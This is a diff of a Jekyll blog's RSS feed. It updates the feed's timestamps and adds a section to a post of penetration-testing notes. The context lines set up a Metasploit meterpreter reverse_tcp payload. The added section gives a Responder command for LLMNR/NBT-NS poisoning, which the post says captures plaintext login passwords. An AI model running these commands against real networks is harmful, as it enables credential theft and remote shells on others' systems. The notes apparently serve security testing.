@@ -5,8 +5,8 @@
     <description>A blog about programming and network security</description>
     <link>http://localhost:4000/</link>
     <atom:link href="http://localhost:4000/feed.xml" rel="self" type="application/rss+xml" />
-    <pubDate>Fri, 09 Jun 2017 21:12:48 +0800</pubDate>
-    <lastBuildDate>Fri, 09 Jun 2017 21:12:48 +0800</lastBuildDate>
+    <pubDate>Tue, 13 Jun 2017 14:11:45 +0800</pubDate>
+    <lastBuildDate>Tue, 13 Jun 2017 14:11:45 +0800</lastBuildDate>
     <generator>Jekyll v3.4.2</generator>
     
       <item>
@@ -890,6 +890,19 @@ set payload windows/meterpreter/reverse_tcp
 set lport 4444
 set lhost xxx.xxx.xxx.xxx
 exploit
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;h4 id=&quot;0xi-responder&quot;&gt;0xi responder&lt;/h4&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;作用:获取系统登录明文密码
+
+./Responder.py -I eth0 -wrf
+
+detail:
+responder是一个LLMNR, NBT-NS and MDNS poisoner,可参考如下link：
+https://github.com/SpiderLabs/Responder
+https://mp.weixin.qq.com/s/ij4olS8GrYr7L-4LFGpQxg
 &lt;/code&gt;&lt;/pre&gt;
 &lt;/div&gt;
 </description>
